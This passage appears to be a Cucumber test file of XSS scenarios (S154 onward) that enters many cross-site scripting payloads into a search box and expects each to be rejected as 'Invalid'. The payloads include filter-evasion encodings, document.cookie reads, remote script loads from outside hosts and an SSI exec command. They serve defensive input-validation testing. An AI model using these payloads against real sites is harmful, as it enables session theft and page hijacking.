		When I enter "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S154 XSS Test 154

		When I enter "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S155 XSS Test 155

		When I enter "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S156 XSS Test 156

		When I enter "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S157 XSS Test 157

		When I enter "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S158 XSS Test 158

		When I enter "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S159 XSS Test 159

		When I enter " <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S160 XSS Test 160

		When I enter "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S161 XSS Test 161

		When I enter "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S162 XSS Test 162

		When I enter "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S163 XSS Test 163

		When I enter "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S164 XSS Test 164

		When I enter "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S165 XSS Test 165

		When I enter "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S166 XSS Test 166

		When I enter "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S167 XSS Test 167

		When I enter "<A HREF=\"http://66.102.7.147/\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S168 XSS Test 168

		When I enter "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S169 XSS Test 169

		When I enter "<A HREF=\"http://1113982867/\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S170 XSS Test 170

		When I enter "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S171 XSS Test 171

		When I enter "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S172 XSS Test 172

		When I enter "<A HREF=\"htt p://6 6.000146.0x7.147/\">XSS</A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S173 XSS Test 173

		When I enter "<iframe src=\"&Tab;javascript:prompt(1)&Tab;\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S174 XSS Test 174

		When I enter "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S175 XSS Test 175

		When I enter "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S176 XSS Test 176

		When I enter "<sVg><scRipt >alert&lpar;1&rpar; {Opera}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S177 XSS Test 177

		When I enter "<img/src=`` onerror=this.onerror=confirm(1) " in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S178 XSS Test 178

		When I enter "<form><isindex formaction=\"javascript&colon;confirm(1)\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S179 XSS Test 179

		When I enter "<img src=``&NewLine; onerror=alert(1)&NewLine;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S180 XSS Test 180

		When I enter "<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S181 XSS Test 181

		When I enter "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S182 XSS Test 182

		When I enter "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S183 XSS Test 183

		When I enter "<script /**/>/**/alert(1)/**/</script /**/" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S184 XSS Test 184

		When I enter "&#34;&#62;<h1/onmouseover='\u0061lert(1)'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S185 XSS Test 185

		When I enter "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S186 XSS Test 186

		When I enter "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S187 XSS Test 187

		When I enter "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S188 XSS Test 188

		When I enter "<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S189 XSS Test 189

		When I enter "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S190 XSS Test 190

		When I enter "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S191 XSS Test 191

		When I enter "<form><a href=\"javascript:\u0061lert&#x28;1&#x29;\">X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S192 XSS Test 192

		When I enter "</script><img/*/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/*/onerror='eval(src)'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S193 XSS Test 193

		When I enter "<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S194 XSS Test 194

		When I enter "<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S195 XSS Test 195

		When I enter "<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S196 XSS Test 196

		When I enter "http://www.google<script .com>alert(document.location)</script" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S197 XSS Test 197

		When I enter "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S198 XSS Test 198

		When I enter "<img/src=@&#32;&#13; onerror = prompt('&#49;')" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S199 XSS Test 199

		When I enter "<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S200 XSS Test 200

		When I enter "<script ^__^>alert(String.fromCharCode(49))</script ^__^" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S201 XSS Test 201

		When I enter "</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S202 XSS Test 202

		When I enter "&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S203 XSS Test 203

		When I enter "<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S204 XSS Test 204

		When I enter "<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S205 XSS Test 205

		When I enter "<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S206 XSS Test 206

		When I enter "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S207 XSS Test 207

		When I enter "<script ~~~>alert(0%0)</script ~~~>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S208 XSS Test 208

		When I enter "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S209 XSS Test 209

		When I enter "<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S210 XSS Test 210

		When I enter "<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S211 XSS Test 211

		When I enter "&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S212 XSS Test 212

		When I enter "&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S213 XSS Test 213

		When I enter "<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S214 XSS Test 214

		When I enter "<div/style=\"width:expression(confirm(1))\">X</div> {IE7}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S215 XSS Test 215

		When I enter "<iframe// src=javaSCRIPT&colon;alert(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S216 XSS Test 216

		When I enter "//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S217 XSS Test 217

		When I enter "/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S218 XSS Test 218

		When I enter "//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S219 XSS Test 219

		When I enter "</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S220 XSS Test 220

		When I enter "<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S221 XSS Test 221

		When I enter "</plaintext\></|\><plaintext/onmouseover=prompt(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S222 XSS Test 222

		When I enter "</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S223 XSS Test 223

		When I enter "<a href=\"javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S224 XSS Test 224

		When I enter "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S225 XSS Test 225

		When I enter "<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S226 XSS Test 226

		When I enter "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S227 XSS Test 227

		When I enter "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S228 XSS Test 228

		When I enter "<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S229 XSS Test 229

		When I enter "<var onmouseover=\"prompt(1)\">On Mouse Over</var>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S230 XSS Test 230

		When I enter "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S231 XSS Test 231

		When I enter "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S232 XSS Test 232

		When I enter "<%<!--'%><script>alert(1);</script -->" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S233 XSS Test 233

		When I enter "<script src=\"data:text/javascript,alert(1)\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S234 XSS Test 234

		When I enter "<iframe/src \/\/onload = prompt(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S235 XSS Test 235

		When I enter "<iframe/onreadystatechange=alert(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S236 XSS Test 236

		When I enter "<svg/onload=alert(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S237 XSS Test 237

		When I enter "<input value=<><iframe/src=javascript:confirm(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S238 XSS Test 238

		When I enter "<input type=\"text\" value=`` <div/onmouseover='alert(1)'>X</div>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S239 XSS Test 239

		When I enter "<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S240 XSS Test 240

		When I enter "<img src=`xx:xx`onerror=alert(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S241 XSS Test 241

		When I enter "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S242 XSS Test 242

		When I enter "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S243 XSS Test 243

		When I enter "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S244 XSS Test 244

		When I enter "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S245 XSS Test 245

		When I enter "<svg contentScriptType=text/vbs><script>MsgBox+1" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S246 XSS Test 246

		When I enter "<a href=\"data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>\">X</a" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S247 XSS Test 247

		When I enter "<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S248 XSS Test 248

		When I enter "<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S249 XSS Test 249

		When I enter "<script/src=\"data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')\"></script a=\u0061 & /=%2F" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S250 XSS Test 250

		When I enter "<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S251 XSS Test 251

		When I enter "<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S252 XSS Test 252

		When I enter "<script>+-+-1-+-+alert(1)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S253 XSS Test 253

		When I enter "<body/onload=&lt;!--&gt;&#10alert(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S254 XSS Test 254

		When I enter "<script itworksinallbrowsers>/*<script* */alert(1)</script" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S255 XSS Test 255

		When I enter "<img src ?itworksonchrome?\/onerror = alert(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S256 XSS Test 256

		When I enter "<svg><script>//&NewLine;confirm(1);</script </svg>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S257 XSS Test 257

		When I enter "<svg><script onlypossibleinopera:-)> alert(1)" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S258 XSS Test 258

		When I enter "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S259 XSS Test 259

		When I enter "<script x> alert(1) </script 1=2" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S260 XSS Test 260

		When I enter "<div/onmouseover='alert(1)'> style=\"x:\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S261 XSS Test 261

		When I enter "<--`<img/src=` onerror=alert(1)> --!>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S262 XSS Test 262

		When I enter "<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S263 XSS Test 263

		When I enter "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S264 XSS Test 264

		When I enter "\"><img src=x onerror=window.open('https://www.google.com/');>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S265 XSS Test 265

		When I enter "<form><button formaction=javascript&colon;alert(1)>CLICKME" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S266 XSS Test 266

		When I enter "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S267 XSS Test 267

		When I enter "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S268 XSS Test 268

		When I enter "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S269 XSS Test 269

		When I enter "<a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S270 XSS Test 270

		When I enter "" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S271 XSS Test 271

		When I enter "'';!--\"<XSS>=&{()}" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S272 XSS Test 272

		When I enter "'>//\\,<'>\">\">\"*\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S273 XSS Test 273

		When I enter "'); alert('XSS" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S274 XSS Test 274

		When I enter "<script>alert(1);</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S275 XSS Test 275

		When I enter "<script>alert('XSS');</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S276 XSS Test 276

		When I enter "<IMG SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S277 XSS Test 277

		When I enter "<IMG SRC=javascript:alert('XSS')>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S278 XSS Test 278

		When I enter "<IMG SRC=javascript:alert('XSS')>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S279 XSS Test 279

		When I enter "<IMG SRC=javascript:alert(&quot;XSS&quot;)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S280 XSS Test 280

		When I enter "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S281 XSS Test 281

		When I enter "<scr<script>ipt>alert('XSS');</scr</script>ipt>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S282 XSS Test 282

		When I enter "<script>alert(String.fromCharCode(88,83,83))</script> " in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S283 XSS Test 283

		When I enter "<img src=foo.png onerror=alert(/xssed/) />" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S284 XSS Test 284

		When I enter "<style>@im\port'\ja\vasc\ript:alert(\\"XSS\\")';</style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S285 XSS Test 285

		When I enter "<? echo('<scr)'; echo('ipt>alert(\\"XSS\\")</script>'); ?>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S286 XSS Test 286

		When I enter "<marquee><script>alert('XSS')</script></marquee>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S287 XSS Test 287

		When I enter "<IMG SRC=\\"jav&#x09;ascript:alert('XSS');\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S288 XSS Test 288

		When I enter "<IMG SRC=\\"jav&#x0A;ascript:alert('XSS');\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S289 XSS Test 289

		When I enter "<IMG SRC=\\"jav&#x0D;ascript:alert('XSS');\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S290 XSS Test 290

		When I enter "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S291 XSS Test 291

		When I enter "\"><script>alert(0)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S292 XSS Test 292

		When I enter "<script src=http://yoursite.com/your_files.js></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S293 XSS Test 293

		When I enter "</title><script>alert(/xss/)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S294 XSS Test 294

		When I enter "</textarea><script>alert(/xss/)</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S295 XSS Test 295

		When I enter "<IMG LOWSRC=\\"javascript:alert('XSS')\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S296 XSS Test 296

		When I enter "<IMG DYNSRC=\\"javascript:alert('XSS')\\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S297 XSS Test 297

		When I enter "<font style='color:expression(alert(document.cookie))'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S298 XSS Test 298

		When I enter "<img src=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S299 XSS Test 299

		When I enter "<script language=\"JavaScript\">alert('XSS')</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S300 XSS Test 300

		When I enter "<body onunload=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S301 XSS Test 301

		When I enter "<body onLoad=\"alert('XSS');\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S302 XSS Test 302

		When I enter "[color=red' onmouseover=\"alert('xss')\"]mouse over[/color]" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S303 XSS Test 303

		When I enter "\"/></a></><img src=1.gif onerror=alert(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S304 XSS Test 304

		When I enter "window.alert(\"Bonjour !\");" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S305 XSS Test 305

		When I enter "<div style=\"x:expression((window.r==1)?'':eval('r=1;" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S306 XSS Test 306

		When I enter "alert(String.fromCharCode(88,83,83));'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S307 XSS Test 307

		When I enter "<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S308 XSS Test 308

		When I enter "\"><script alert(String.fromCharCode(88,83,83))</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S309 XSS Test 309

